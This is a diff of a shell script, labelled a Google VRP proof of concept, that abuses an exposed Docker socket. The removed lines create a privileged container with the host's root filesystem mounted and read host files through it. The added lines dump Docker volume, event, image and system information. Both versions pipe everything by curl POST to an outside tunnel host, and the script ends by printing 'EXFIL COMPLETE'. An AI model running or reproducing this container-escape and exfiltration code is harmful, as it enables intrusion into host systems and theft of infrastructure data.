@@ -2,61 +2,24 @@
 URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: DEEP SYSTEM PROBE ==="
-  echo "Timestamp: $(date)"
-
-  # 1. Identity & Network Check (Pre-Escape)
-  echo "--- [1] PRE-ESCAPE NETWORK INFO ---"
-  echo "Local Hostname: $(hostname)"
-  echo "Internal IP: $(hostname -I)"
+  echo "=== [!] GOOGLE VRP: VOLUME DISCLOSURE PoC ==="
   
-  # 2. Image Discovery
-  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
-  echo "Using Image: $IMG"
-
-  # 3. Escape Attempt (Syntax-Corrected Binds)
-  # We use the raw host path '/' and mount it to '/host'
-  echo "--- [2] CONTAINER CREATION ---"
-  RESP=$(curl -s -X POST --unix-socket /var/run/docker.sock \
-    -H "Content-Type: application/json" \
-    -d "{
-      \"Image\": \"$IMG\",
-      \"HostConfig\": {
-        \"Binds\": [\"/:/host:ro\"],
-        \"Privileged\": true,
-        \"NetworkMode\": \"host\"
-      }
-    }" http://localhost/containers/create 2>&1)
+  # 1. Show the Volume actually exists and points to /
+  echo "--- [1] PROVING HOST-ROOT BIND ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/volumes/p0_root
   
-  echo "Create Response: $RESP"
-  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
+  # 2. Extract Docker Events
+  # This leaks what the host is doing in the background!
+  echo -e "\n--- [2] LEAKING SYSTEM EVENTS (HOST ACTIVITY) ---"
+  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 20
+  
+  # 3. List all Host Images (Metadata Leak)
+  echo -e "\n--- [3] LEAKING INFRASTRUCTURE IMAGES ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+  
+  # 4. Final Verification: Can we read Docker's internal config?
+  echo -e "\n--- [4] DOCKER SYSTEM CONFIG ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/info
 
-  if [ -n "$ID" ]; then
-    echo "[+] Container $ID created. Attempting Start..."
-    START_RESP=$(curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/$ID/start 2>&1)
-    echo "Start Response: $START_RESP"
-    
-    sleep 2
-
-    # 4. Critical Data Siphon
-    echo "--- [3] HOST DATA EXTRACTION ---"
-    
-    echo "[*] Reading Host Hostname:"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/hostname" | tar -xO 2>&1
-    
-    echo "[*] Reading Host Hosts File (Network Logic):"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/hosts" | tar -xO 2>&1
-    
-    echo "[*] Reading Host OS Release:"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/os-release" | tar -xO 2>&1
-
-    # 5. Cleanup
-    curl -s -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/$ID?force=true" > /dev/null
-  else
-    echo "[!] Escape Failed. Analyzing Error..."
-    # If creation failed, it might be the 'Binds' logic. Let's try to list existing volumes.
-    curl -s --unix-socket /var/run/docker.sock http://localhost/volumes 2>&1
-  fi
-
-  echo "=== [!] PROBE COMPLETE ==="
+  echo -e "\n=== [!] EXFIL COMPLETE ==="
 } | curl -s -X POST --data-binary @- "https://$URL"
